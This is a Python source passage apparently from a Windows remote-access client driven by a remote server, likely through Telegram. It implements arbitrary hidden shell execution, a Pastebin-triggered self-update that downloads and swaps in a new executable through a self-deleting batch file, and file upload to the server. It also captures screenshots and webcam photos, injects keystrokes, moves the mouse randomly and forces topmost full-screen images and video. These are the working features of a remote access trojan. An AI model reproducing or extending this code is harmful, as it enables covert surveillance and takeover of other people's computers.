                path = parts[2] or "N/A" # The path may be empty for system processes
                pid = parts[3]
                
                # Format into one clean line
                formatted_line = (
                    f"{image_name:<30}"[:30] + 
                    f" | {pid:<5}" + 
                    f" | {path}\n"
                )
                output_lines.append(formatted_line)
                data_found = True
        
        if not data_found:
             # If the data is not found, return an error
             return f"❌ Could not find running processes. WMIC exit code: {result.returncode}"

        # 2. Create a temporary file
        with tempfile.NamedTemporaryFile(mode='w', suffix='_tasklist.txt', delete=False, encoding='utf-8') as tmp:
            tmp.writelines(output_lines)
            temp_file_path = tmp.name
        
        # 3. RETURNING THE PATH TO THE FILE
        return temp_file_path  

    except Exception as e:
        return f"❌ Critical Error Tasklist (WMIC): {e}"

# ====== Working with windows ======
def cmd_applist(args):
    args = args.strip()

    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if not args:
        if not windows:
            return "❌ No open windows."

        lines = ["📋 Open windows:"]
        for i, (_, title) in enumerate(windows, start=1):
            lines.append(f"{i}. {title}")

        return "\n".join(lines)

    if not args.isdigit():
        return "❌ Specify the window number: /applist <number>"

    index = int(args)

    if index < 1 or index > len(windows):
        return f"❌ Invalid number. Available: 1..{len(windows)}"

    hwnd, title = windows[index - 1]

    if force_focus_window(hwnd):
        return f"➡️ Окно «{title}» выведено на передний план."
    else:
        return f"❌ Failed to activate window."


def cmd_applist_title(args):
    """
    /applist_title <window number> <new title>
    Renames the window at the specified index.
    """
    parts = args.strip().split(maxsplit=1)

    if len(parts) < 2:
        return "❌ Format: /applist_title <number> <new title>"

    index_str, new_title = parts
    if not index_str.isdigit():
        return "❌ The window index must be a number."

    index = int(index_str)

    # Collecting a list of windows
    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if index < 1 or index > len(windows):
        return f"❌ Invalid number. Available: 1..{len(windows)}"

    hwnd, old_title = windows[index - 1]

    try:
        # Change the title
        ctypes.windll.user32.SetWindowTextW(hwnd, new_title)
        return f"✏️ The title “{old_title}” has been replaced with «{new_title}»."

    except Exception as e:
        return f"❌Header change error: {e}"


def cmd_applist_close(args):
    args = args.strip()

    if not args.isdigit():
        return "❌Format: /applist_close <number>"

    index = int(args)

    windows = []
    win32gui.EnumWindows(enum_windows_callback, windows)

    if index < 1 or index > len(windows):
        return f"❌Invalid number. Available: 1..{len(windows)}"

    hwnd, title = windows[index - 1]

    try:
        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        return f"🛑 Окно «{title}» sent for closure."
    except Exception as e:
        return f"❌ Error Closings: {e}"


def cmd_minimize(args):
    try:
        # Win + Down Arrow
        pyautogui.hotkey("win", "down")
        return "✅ Active window minimized."
    except Exception as e:
        return f"❌ Error: {e}"


def cmd_maximize(args):
    try:
        # Win + Up Arrow
        pyautogui.hotkey("win", "up")
        return "✅ Active window maximized."
    except Exception as e:
        return f"❌ Error: {e}"


# ====== Input control ======
def cmd_holdkey(args: str):
    """
    Presses one or more keys for a specified time in a background thread.

    Format:
        /holdkey <seconds> <key1> [key2 ...]

    Example:
        /holdkey 5w
        /holdkey 2 ctrl shift a
    """

    def _worker(keys, duration):
        try:
            # Clamp
            for key in keys:
                pyautogui.keyDown(key)

            time.sleep(duration)

        except Exception as e:
            logger.error(f"Error в holdkey-потоке: {e}")

        finally:
            # guaranteed to release the keys
            for key in keys:
                try:
                    pyautogui.keyUp(key)
                except Exception:
                    pass

    try:
        parts = args.split()
        if len(parts) < 2:
            return "❌ Format: /holdkey <seconds> <key1> [key2 ...]"

        # ---time ---
        try:
            duration = float(parts[0])
            if duration <= 0:
                return "❌ Time must be greater than 0."
            duration = min(duration, 30.0)  # fool proof
        except ValueError:
            return "❌ Invalid time value (need number)."

        # ---keys ---
        keys = [k.strip().lower() for k in parts[1:] if k.strip()]
        if not keys:
            return "❌ Please specify at least one key."

        threading.Thread(
            target=_worker,
            args=(keys, duration),
            daemon=True
        ).start()

        return f"✅ Keys `{', '.join(keys)}` held down for {duration} sec"

    except Exception as e:
        return f"❌Error when executing the command: {e}"


def cmd_keypress(args):
    """Press the key combination: /keypress alt f4"""
    if not args or not args.strip():
        return "Use: /keypress <keys>"
    
    keys = [k.strip().lower() for k in args.split() if k.strip()]
    if not keys:
        return "Specify the keys."
    
    try:
        pyautogui.hotkey(*keys, interval=0.05)
        return f"Pushed: `{', '.join(keys)}`"
    except Exception as e:
        return f"Error: {e}"


def cmd_keytype(args):
    """Enters the entire text, without spaces between characters."""
    if not args:
        return "Use: /keytype <text>"
    
    try:
        # Use keyboard.write() -it correctly enters Cyrillic and English
        keyboard.write(args)
        # Optional: simulate human input with a delay
        # keyboard.write(args, delay=0.05)
        return f"Text entered: {args}"
    except Exception as e:
        return f"Error input: {e}"


def cmd_altf4(args):
    try:
        pyautogui.hotkey('alt', 'f4')
        return '✅ Pushed ALT + F4.'
    except Exception as e:
        return f'❌ Error: {e}'


# ====== Mouse control ======
def cmd_mouseclick(args):
    try:
        pyautogui.click()
        return '✅ Mouse click executed.'
    except Exception as e:
        return f'❌ Error: {e}'


def cmd_mousemesstart(args):
    """
    Starts random mouse movement in a background thread.
    Stopping is done through the existing cmd_mousemesstop.
    """
    global mouse_mess_thread

    if mouse_mess_thread and mouse_mess_thread.is_alive():
        return "⚠️ Chaos already started."

    mouse_mess_stop_event.clear()

    def _mouse_mess_loop():
        logger.info("Mouse mess thread started.")
        try:
            while not mouse_mess_stop_event.is_set():
                screen_width, screen_height = pyautogui.size()

                x = random.randint(100, screen_width - 100)
                y = random.randint(100, screen_height - 100)

                pyautogui.moveTo(x, y, duration=0.05)
                time.sleep(0.1)

        except Exception as e:
            logger.error(f"Mouse mess error: {e}")

        finally:
            logger.info("Mouse mess thread stopped.")

    mouse_mess_thread = threading.Thread(
        target=_mouse_mess_loop,
        daemon=True
    )
    mouse_mess_thread.start()

    return "✅ Mouse chaos started!"


def cmd_mousemesstop(args):
    global mouse_mess_thread
    if mouse_mess_thread and mouse_mess_thread.is_alive():
        # Set a flag to stop the loop
        mouse_mess_stop_event.set()
        # Wait for the thread to finish (with a timeout of 2s)
        mouse_mess_thread.join(2) 
        mouse_mess_thread = None
        return '✅ Mouse chaos stopped.'
    
    return '⚠️ Mouse chaos was not started.'


def cmd_mousemove(args):
    if not args:
        return "❌ Specify X and Y coordinates."
    try:
        cordinates = args.strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])

        pyautogui.moveTo(x, y)
        return f'✅ Mouse pointer moved to {x}, {y}.'
    except (ValueError, IndexError):
        return "❌ Invalid coordinate format. Use: X Y (integers)."
    except Exception as e:
        return f'❌ Error: {e}'


# ====== Build management ======
def cmd_whereami(args):
    """
    /whereami
    Shows paths to EXE, working directory, modules and libraries.
    """
    try:
        # Main process paths
        exe_path = sys.executable
        work_dir = os.getcwd()
        
        # Calculate paths to system folders (SystemData)
        sys_data_dir = os.path.join(os.getenv('APPDATA'), 'SystemData')
        plugins_dir = os.path.join(sys_data_dir, 'modules')
        libs_dir = os.path.join(sys_data_dir, 'libs')
        
        # Check the presence of folders for clarity (put an icon)
        def check_path(p):
            return "✅" if os.path.exists(p) else "❌ (не создана)"

        return (
            f"📍 *Information about location:*\n\n"
            f"🔹 *Executable file (EXE):*\n`{exe_path}`\n\n"
            f"🔹 *Working directory:* {check_path(work_dir)}\n`{work_dir}`\n\n"
            f"─── *MODULE SYSTEM* ───\n\n"
            f"🧩 *Modules folder (.dat):* {check_path(plugins_dir)}\n"
            f"`{plugins_dir}`\n\n"
            f"📚 *Libraries folder (libs):* {check_path(libs_dir)}\n"
            f"`{libs_dir}`\n\n"
            f"🌐 *In search of Python (sys.path):* `{len(sys.path)} paths`"
        )
    except Exception as e:
        return f"❌ *Error collecting paths:* `{e}`"


def cmd_restart(args):
    """
    Correct restart: detaching process and hard termination.
    """
    try:
        # 1. Get the path to the current file
        # If this is an exe (after PyInstaller), sys.executable is the path to the exe.
        # If this is a script, then this is the path to the interpreter.
        executable = sys.executable
        script_args = sys.argv
        
        # 2. Forming a team
        # Important: for Windows we use DETACHED_PROCESS so that processes are not associated
        DETACHED_PROCESS = 0x00000008
        
        logger.info("Starting a new process...")
        
        # Start a new process without shell=True and without inheriting handles
        subprocess.Popen(
            [executable] + script_args,
            creationflags=DETACHED_PROCESS,
            close_fds=True,
            cwd=os.getcwd() # It is important to run in the same working directory
        )

        # 3. Give the OS time to initialize the new process (200ms is enough)
        time.sleep(0.2)
        
        #4. HARD FINISH
        # Instead of sys.exit(0), which can wait for threads, use os._exit
        # This instantly kills the process at the kernel level.
        logger.info("Old process terminates immediately (os._exit)")
        os._exit(0)

    except Exception as e:
        logger.error(f"Error restarting: {e}")
        return f"❌ Error: {e}", True, None


def cmd_update(args, conn):
    """
    Format:
    /update https://pastebin.com/raw/XXXXXXX
    """
    if not args.strip():
        return "❌ Specify raw URL Pastebin: /update https://pastebin.com/raw/XXXXXX"

    pastebin_url = args.strip()

    try:
        # 1. Download the contents of Pastebin
        response = requests.get(pastebin_url)
        response.raise_for_status()
        content = response.text.strip()

        # 2. Parsim: "Ver X -url"
        if not content.startswith("Ver "):
            return "❌ Incorrect Pastebin Format. Expected: 'Ver X - link'"

        parts = content.split(" - ", 1)
        if len(parts) != 2:
            return "❌ Incorrect Format. Expected: 'Ver X - link'"
        ver_str = parts[0][4:].strip()
        download_link = parts[1].strip()

        new_version = int(ver_str)

        # 3. Check the version
        global CURRENT_VERSION
        if new_version <= CURRENT_VERSION:
            return f"ℹ️ Client is already on the latest version (current: {CURRENT_VERSION}, available: {new_version})."

        # 4. Download a new exe
        send_response(conn, f"✅ New version {new_version} detected. Download...")

        new_exe_response = requests.get(download_link, stream=True)
        new_exe_response.raise_for_status()

        current_exe = sys.executable
        temp_exe = os.path.join(os.path.dirname(current_exe), f"new_client_{new_version}.exe")

        with open(temp_exe, 'wb') as f:
            for chunk in new_exe_response.iter_content(chunk_size=8192):
                f.write(chunk)

        # 5. Create BAT for replacement
        bat_path = os.path.join(os.path.dirname(current_exe), "update.bat")
        bat_content = f"""@echo off
timeout /t 2 /nobreak >nul
taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
copy /Y "{temp_exe}" "{current_exe}"
del "{temp_exe}"
start "" "{current_exe}"
del "%~f0"
"""
        with open(bat_path, 'w') as bat_file:
            bat_file.write(bat_content)

        #6. Launch BAT
        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
        send_response(conn, "✅ Update downloaded. Client will restart to apply.")

        os._exit(0)

    except Exception as e:
        return f"❌ Error updating: {e}"


# ====== Music control ======
def cmd_playsound(args, conn):
    global music_thread, _mixer_initialized

    if not args:
        # FIXED: sending the response explicitly rather than doing a return
        send_response(conn, "❌ Specify the path to the audio file.")
        return

    full_path = os.path.join(current_path, args.strip())

    if not os.path.isfile(full_path):
        # FIXED: sending the response explicitly
        send_response(conn, f"❌ File not found: '{full_path}'")
        return

    # ---Initialize mixer ---
    if not _mixer_initialized:
        try:
            if not pygame.mixer.get_init():
                pygame.mixer.init()
            _mixer_initialized = True
        except pygame.error as e:
            logger.error(f"Failed to initialize pygame mixer: {e}")
            send_response(conn, "❌ Failed to initialize Pygame audio mixer.")
            return

    # ---Stop previous ---
    if music_thread and music_thread.is_alive():
        music_stop_event.set()
        music_thread.join(timeout=1)
        music_stop_event.clear()

    # ---Playback stream ---
    def _playback():
        global music_thread
        try:
            pygame.mixer.music.stop()
            pygame.mixer.music.load(full_path)
            pygame.mixer.music.play()

            send_response(conn, "🎵Music launched successfully")

            # Wait while it plays
            while pygame.mixer.music.get_busy() and not music_stop_event.is_set():
                time.sleep(0.5)

            if not music_stop_event.is_set():
                send_response(conn, "✅ Music playback completed")
            else:
                send_response(conn, "🛑 Playback stopped manually")

        except Exception as e:
            send_response(conn, f"❌ Error during playback: {e}")

        finally:
            music_stop_event.clear()

    music_thread = threading.Thread(target=_playback, daemon=True)
    music_thread.start()


def cmd_stopsound(args):
    """
    Stops playing an audio file.
    """
    global music_thread

    # 1. First, FORCEDLY stop the sound itself in the engine
    try:
        # This command instantly cuts audio, regardless of threads
        pygame.mixer.music.stop() 
    except Exception:
        pass

    # 2. Now we correctly terminate the observation thread
    if music_thread and music_thread.is_alive():
        music_stop_event.set()
        # Give the thread time to complete (it will exit while since the music is stopped)
        music_thread.join(timeout=1)
        music_thread = None
        return "✅ Playback stopped."
    
    return "⚠️ Playback not started."


# ====== Volume control ======
def cmd_volumeplus(args):
    logger.debug(f"Executes /volumeplus with arguments: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumeup')
            time.sleep(0.05)
        return f"✅ Volume +{steps * 2}%"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_volumeminus(args):
    logger.debug(f"Executes /volumeminus with arguments: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumedown')
            time.sleep(0.05)
        return f"✅ Volume -{steps * 2}%"
    except Exception as e:
        return f"❌ Error: {str(e)}"


# ======Heartbeat/status tracking ======
def cmd_ping(args):
    """
    Just returns status, used for Heartbeat.
    """
    return "alive" # Can return any string


def client_heartbeat_loop():
    logger.info("Heartbeat stream started.")
    while not hb_stop_event.is_set():
        with socket_lock:
            conn = current_socket
        
        if conn:
            try:
                payload = json.dumps({"command": "/ping"}).encode('utf-8') + b'\n'
                
                # 🔥 BLOCK PING
                with send_lock:
                    conn.sendall(payload)
                    
                logger.debug("Heartbeat /ping отправлен.")
            except Exception as e:
                logger.warning(f"Error Heartbeat: {e}")
                hb_stop_event.set() 
                break 

        hb_stop_event.wait(HB_INTERVAL)


# ====== Run files/commands/media ======
def cmd_run(args):
    global current_path 
    
    if not args:
        return "❌ Specify the file name to run."

    try:
        # Extract the file name (remove quotes/spaces)
        file = args.strip('"\' ')
        
        # 1. Form the full path
        full_path = os.path.join(current_path, file)
        
        #2. Check for existence
        if not os.path.isfile(full_path):
            return f"❌ File not found: {full_path}"

        #3. Running a file (Universal and reliable method for Windows)
        # We use Popen, similar to your os.popen('start "" "{path}"')
        
        # Windows: os.startfile or 'start' via shell
        if os.name == 'nt': 
            try:
                # Trying to use os.startfile (cleanest way)
                os.startfile(full_path)
            except AttributeError:
                # If os.startfile is not available, use Popen with 'start' command
                subprocess.Popen(f'start "" "{full_path}"', shell=True)
            except Exception as e:
                 # If Error is right or another problem
                 return f'❌ Error Launch (Win): {e}'
        else: 
            # Non-Windows (Unix-like): for the general case
             subprocess.Popen(['xdg-open', full_path]) 

        return f'✅ Открыт: {file}'

    except Exception as e:
        logger.error(f"Error when running the file: {e}")
        return f'❌ Error at startup: {e}'
       

def cmd_execute(args: str):
    """
    Executes a system command in a background thread.
    The main loop does not block and does not automatically send a response.
    """
    if not args:
        return "❌ Specify the command to execute."

    TELEGRAM_TEXT_LIMIT = 4000

    # ---securely receive connection ---
    with socket_lock:
        conn = current_socket
        response_func = send_response

    if not conn:
        return "❌ There is no active connection. The command will not be executed."

    def _worker():
        def worker_send_response(message=None, is_error=False, is_file=False, file_path=None):
            if is_error:
                logger.error(f"Error в /execute worker: {message}")

            response_func(
                conn,
                message,
                cmd_name="/execute",
                is_file=is_file,
                file_path=file_path
            )

        try:
            # ----------GUI commands (Windows) ----------
            is_gui_command = (
                any(ext in args.lower() for ext in ('.exe', '.com', '.bat')) or
                any(app in args.lower() for app in ('mspaint', 'notepad', 'calc', 'explorer'))
            )

            if os.name == "nt" and is_gui_command:
                subprocess.Popen(
                    args,
                    shell=True,
                    creationflags=(
                        subprocess.DETACHED_PROCESS |
                        subprocess.CREATE_NEW_PROCESS_GROUP
                    )
                )
                worker_send_response(
                    f"✅ The GUI application '{args}' is running in the background. There will be no conclusionт."
                )
                return

            # ----------CLI commands ----------
            result = subprocess.run(
                args,
                shell=True,
                capture_output=True,
                text=True,
                encoding="cp866" if os.name == "nt" else "utf-8",
                errors="replace",
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
            )

            stdout = result.stdout.strip()
            stderr = result.stderr.strip()

            parts = []
            if stdout:
                parts.append("--- STDOUT ---\n" + stdout)
            if stderr:
                parts.append("--- STDERR ---\n" + stderr)

            response = (
                "\n\n".join(parts)
                if parts
                else f"The command completed successfully, there is no output (code {result.returncode})."
            )

            # ----------long output → file ----------
            if len(response) > TELEGRAM_TEXT_LIMIT:
                with tempfile.NamedTemporaryFile(
                    mode="w",
                    suffix="_execute.txt",
                    delete=False,
                    encoding="utf-8"
                ) as tmp:
                    tmp.write(f"Team: {args}\n")
                    tmp.write("=" * (len(args) + 10) + "\n\n")
                    tmp.write(response)
                    temp_path = tmp.name

                worker_send_response(
                    message=None,
                    is_file=True,
                    file_path=temp_path
                )
            else:
                worker_send_response(response)

        except Exception as e:
            worker_send_response(
                f"❌ Critical command execution error: {e}",
                is_error=True
            )

    threading.Thread(
        target=_worker,
        daemon=True
    ).start()

    # KEY: the response will be sent from the worker
    return None


def cmd_wallpaper(args):
    logger.debug(f"Executes /wallpaper with arguments: {args}")
    try:
        path_arg = args.strip()
        if not path_arg:
            return "❌Specify the path"
        path = path_arg if os.path.isabs(path_arg) else os.path.join(current_path, path_arg)
        path = os.path.abspath(path)
        if not os.path.isfile(path):
            return "❌ File not found"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "✅ Wallpaper changed"
    except Exception as e:
        return f"❌ Error: {str(e)}"


def cmd_open_image(args, conn):
    """
    Opens an image in fullscreen mode over all windows for a specified time.
    Resolved the issue with Cyrillic paths and enhanced the "on top of all windows" effect.
    Format: /open_image <seconds> <file path>
    """
    global current_path, file_lock
    logger.debug(f"Executes /open_image with arguments: {args}")
    
    # Window name
    window_name = f"fullscreen_image_viewer_{os.getpid()}" 
    
    try:
        parts = args.strip().split(None, 1)
        if len(parts) < 2:
            send_response(conn, "❌ Format: /open_image <seconds> <file path>")
            return
        
        # ... (Checking seconds remains the same)
        try:
            seconds = int(parts[0])
            if seconds <= 0:
                send_response(conn, "❌ Time must be > 0 seconds.")
                return
        except ValueError:
            send_response(conn, "❌ Invalid time format. Please specify a number of seconds.")
            return

        user_path = parts[1]
        
        #2. Validation and path reading (Updated logic)
        with file_lock:
            #1. Combining the path
            full_path = os.path.join(current_path, user_path)
            
            #2. Get the absolute, normalized path
            full_path = os.path.abspath(full_path) 
            
            # 3. CHECK FOR EXISTENCE (For Cyrillic, os.path.isfile often works better,
            # if you pass it a normalized path)
            if not os.path.isfile(full_path):
                send_response(conn, f"❌ File not found: {full_path}")
                return
        
        logger.debug(f"Attempting to read image from absolute path: {full_path}")
        
        # 3. Reading an image with Cyrillic support (Remains the same, because it is correct)
        # Read the file as a binary array
        with open(full_path, 'rb') as f:
            data = f.read()
        
        # Convert the binary data into a numpy array and decode it as an image
        np_arr = np.frombuffer(data, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_UNCHANGED)
        
        if image is None:
            send_response(conn, "❌ Failed to read the file (possibly not an image).")
            return

    except Exception as e:
        send_response(conn, f"❌ Error preparing: {e}")
        return

    # 4. Show (Enhance the “on top of all windows” effect)
    try:
        # 1. Create a window with the WND_PROP_FULLSCREEN flag
        cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
        
        # 2. Set the WINDOW_FULLSCREEN property
        cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        
        # 🔥 3. Additionally install TOPMOST (make it on top of others), 
        # although WINDOW_FULLSCREEN should already do this.
        cv2.setWindowProperty(window_name, cv2.WND_PROP_TOPMOST, 1)

        #4. Show the image
        cv2.imshow(window_name, image)
        
        send_response(conn, f"✅ Image '{user_path}' has been open for {seconds} seconds. (On top of all)")

        # 5. We wait ONLY for time, keystrokes are ignored
        end_time = time.time() + seconds
        
        while time.time() < end_time:
            cv2.waitKey(50)  # just lets the GUI update
        
        
    except Exception as e:
        send_response(conn, f"❌ Error while displaying an image (GUI/Full-Screen): {e}")
    finally:
       # Guaranteed window closure
        cv2.destroyAllWindows() 
        cv2.waitKey(1)


def cmd_open_video(args):
    global video_thread, video_stop_event

    if not args:
        return "❌Specify the path to the video"

    path = args.strip()
    if not os.path.isabs(path):
        path = os.path.join(current_path, path)

    path = os.path.abspath(path)

    if not os.path.isfile(path):
        return "❌ Video not found"

    # if it's already playing, stop it
    if video_thread and video_thread.is_alive():
        video_stop_event.set()
        video_thread.join(timeout=1)

    video_stop_event.clear()

    def video_worker(video_path):
        win_name = "elite"

        try:
            cap = cv2.VideoCapture(video_path)
            if not cap.isOpened():
                logger.error("Failed to open video")
                return

            cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
            cv2.setWindowProperty(
                win_name,
                cv2.WND_PROP_FULLSCREEN,
                cv2.WINDOW_FULLSCREEN
            )

            # wait for the window to appear
            hwnd = None
            for _ in range(50):
                hwnd = win32gui.FindWindow(None, win_name)
                if hwnd:
                    break
                time.sleep(0.02)

            if hwnd:
                # on top of all windows
                win32gui.SetWindowPos(
                    hwnd,
                    win32con.HWND_TOPMOST,
                    0, 0, 0, 0,
                    win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
                )

                # remove frames
                style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
                win32gui.SetWindowLong(
                    hwnd,
                    win32con.GWL_STYLE,
                    style & ~(
                        win32con.WS_CAPTION |
                        win32con.WS_THICKFRAME |
                        win32con.WS_MINIMIZE |
                        win32con.WS_MAXIMIZE |
                        win32con.WS_SYSMENU
                    )
                )

            fps = cap.get(cv2.CAP_PROP_FPS)
            delay = int(1000 / fps) if fps > 0 else 33

            while not video_stop_event.is_set():
                ret, frame = cap.read()
                if not ret:
                    break

                cv2.imshow(win_name, frame)

                # ignore the keys, just need to update the GUI
                cv2.waitKey(delay)

            cap.release()
            cv2.destroyAllWindows()

        except Exception as e:
            logger.error(f"Video error: {e}")
        finally:
            video_stop_event.clear()

    video_thread = threading.Thread(
        target=video_worker,
        args=(path,),
        daemon=True
    )
    video_thread.start()

    return "🎬 The video is running (fullscreen, on top of all windows)"


def cmd_close_video(args):
    if video_thread and video_thread.is_alive():
        video_stop_event.set()
        return "🛑 Video stopped"
    return "⚠️ Video is not running"


# ====== Sending files ======
def send_file(conn, file_path):
    """
    Sends a file to the Server. Atomic operation.
    """
    if not os.path.exists(file_path):
        return f"❌ File not found: {file_path}"

    try:
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)

        header = json.dumps({
            "command": "/upload",
            "file_name": file_name,
            "file_size": file_size
        }).encode('utf-8') + b'\n'

        # 🔥 BLOCKING SENDING FOR OTHER STREAMS
        with send_lock:
            conn.sendall(header)

            with open(file_path, 'rb') as f:
                while True:
                    bytes_read = f.read(8192)
                    if not bytes_read:
                        break
                    conn.sendall(bytes_read)
        
        return None 

    except Exception as e:
        return f"❌ Error when sending file: {str(e)}"


def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
    global current_thread_id 
    
    thread_id_to_send = current_thread_id if current_thread_id is not None else 0 

    try:
        # === Option: send the file ===
        if is_file and file_path and os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)

            header = json.dumps({
                "thread_id": thread_id_to_send,
                "command": "/response_file",
                "file_name": file_name,
                "file_size": file_size,
                "result": f"File result of command {cmd_name} sent."
            }).encode('utf-8') + b'\n'

            # 🔥 BLOCKING (Header + Body)
            with send_lock:
                conn.sendall(header)
                with open(file_path, 'rb') as f:
                    while True:
                        chunk = f.read(8192)
                        if not chunk:
                            break
                        conn.sendall(chunk)

            # Delete the temporary file after complete sending
            try:
                os.remove(file_path)
            except:
                pass
            return

        # === Option: regular text response ===
        response_data = {
            "thread_id": thread_id_to_send,
            "command": cmd_name,
            "result": str(result)
        }
        response = json.dumps(response_data).encode('utf-8') + b'\n'
        
        # 🔥 BLOCKING (Text response)
        with send_lock:
            conn.sendall(response)

    except Exception as e:
        logger.error(f"Error sending response/file: {e}")


# ====== Screenshots and photos (Answer added) ======
def cmd_screenshot(args, conn):
    logger.debug(f"Executes /screenshot with arguments: {args}")
    temp_path = None
    
    #1. Use tempfile to securely create a temporary file
    # We use .png since cv2.imencode compresses it into memory
    temp_path = os.path.join(os.environ['TEMP'], f'{uuid.uuid4()}.jpg') 
    # Use a unique name to avoid conflicts
    
    try:
        # ---SCREEN CAPTURE BLOCK USING MSS ---
        with mss.mss() as sct:
            #1. Capture the main monitor (index 1 corresponds to the first monitor)
            # If you need to capture ALL monitors, you need to iterate over them
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            
            #2. Convert captured mss image (BGRA) to OpenCV array (BGR)
            img_array = np.array(sct_img, dtype=np.uint8)
            # mss returns 4 channels (BGRA), cv2.imwrite works better with 3 channels (BGR)
            image = cv2.cvtColor(img_array, cv2.COLOR_BGRA2BGR)
            
        # ---OPTIMIZATION AND SAVING ---
        # Immediately save with the desired JPEG quality (95)
        success = cv2.imwrite(temp_path, image, [int(cv2.IMWRITE_JPEG_QUALITY), 95])

        if not success or os.path.getsize(temp_path) < 1024:
            # Check the size in case the screenshot is very small
            send_response(conn, "❌ Failed to make or save screenshot (file too small).")
            return

        # ---SENDING ---
        error = send_file(conn, temp_path)
        send_response(conn, error or "✅ Screenshot sent")
        return None
        
    except Exception as e:
        send_response(conn, f"❌ Скриншот: {str(e)}")
        return None
        
    finally:
        # Clear temporary file
        if temp_path and os.path.exists(temp_path):
            os.remove(temp_path)

def cmd_screenshot_full(args, conn):
    temp_path = os.path.join(
        tempfile.gettempdir(),
        f"screen_full_{uuid.uuid4().hex}.png"
    )

    try:
        # ===== DPI =====
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()

        # ===== VIRTUAL SCREEN (ALL MONITORS) =====
        width  = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left   = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top    = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

        hdesktop = win32gui.GetDesktopWindow()
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()

        bmp = win32ui.CreateBitmap()
        bmp.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(bmp)

        mem_dc.BitBlt(
            (0, 0),
            (width, height),
            img_dc,
            (left, top),
            win32con.SRCCOPY
        )

        # ===== CURSOR =====
        flags, hcursor, (cx, cy) = win32gui.GetCursorInfo()
        if flags == win32con.CURSOR_SHOWING:
            info = win32gui.GetIconInfo(hcursor)
            win32gui.DrawIconEx(
                mem_dc.GetSafeHdc(),
                cx - left - info[1],
                cy - top - info[2],
                hcursor,
                0, 0, 0,
                None,
                win32con.DI_NORMAL
            )

        # ===== In PIL =====
        bmp_info = bmp.GetInfo()
        bmp_bits = bmp.GetBitmapBits(True)

        img = Image.frombuffer(
            "RGB",
            (bmp_info["bmWidth"], bmp_info["bmHeight"]),
            bmp_bits,
            "raw",
            "BGRX",
            0, 1
        )
        img.save(temp_path)

        # ===== CLEAN DC =====
        mem_dc.DeleteDC()
        win32gui.ReleaseDC(hdesktop, desktop_dc)

        if not os.path.exists(temp_path) or os.path.getsize(temp_path) < 1024:
            send_response(conn, "❌ Screenshot not received")
            return None

        err = send_file(conn, temp_path)
        send_response(conn, err or "✅ Full screenshot (all monitors) sent")
    except Exception as e:
        send_response(conn, f"❌ Screenshot full error: {e}")

    finally:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

    return None

def find_available_cameras():
    """
    Attempts to find available cameras using a simple call,
    to avoid conflicts with backends.
    """
    index = 0
    available_cameras = 0
    # Check up to 10 indexes
    while index < 10: 
        cap = cv2.VideoCapture(index) 
        if cap.isOpened():
            available_cameras += 1
            cap.release()
        else:
            # Heuristic: if 3 consecutive indexes are not available, stop searching.
            if available_cameras > 0 and index - available_cameras >= 3:
                 break
        index += 1
    return available_cameras

def cmd_photo(args, conn):
    """
    Takes a photo from a webcam at the specified index (default 0).
    If no index is specified, returns a list of available cameras.
    """
    logger.debug(f"Executing /photo with arguments: {args}")
    temp_path = None
    
    # 1. DETERMINING CAMERA INDEX OR LISTING
    camera_index = 0 # By the default
    is_index_specified = False
    
    if args.isdigit():
        camera_index = int(args)
        is_index_specified = True
    elif args.strip():
        send_response(conn, "❌ /photo: Camera index must be a number.")
        return

    # If no arguments are specified, show available cameras
    if not is_index_specified:
        num_cams = find_available_cameras()
        if num_cams == 0:
            send_response(conn, "❌ Web cameras not found.")
        else:
            # Message explicitly indicating the indexes available for use
            send_response(conn, f"✅ Found {num_cams} cameras (indexes 0 - {num_cams-1}). Use /photo <index>.")
        return

    try:
        #2. CAPTURE AN IMAGE FROM A SELECTED INDEX
        # 🔥 Use a simple cv2.VideoCapture(index) call that worked
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Camera with index {camera_index} is not available. Try another index.")
            return

        ret = False
        frame = None
        # Warm up and capture (your working code)
        for _ in range(10):
            ret, frame = cap.read()
            if ret:
                break
            time.sleep(0.2)
            
        cap.release()

        if not ret or frame is None:
            send_response(conn, "❌ Failed to get image.")
            return

        #3. Save, check size and send
        temp_path = os.path.join(os.environ['TEMP'], f'webcam_{int(time.time())}.jpg')
        cv2.imwrite(temp_path, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])

        if os.path.getsize(temp_path) < 1024:
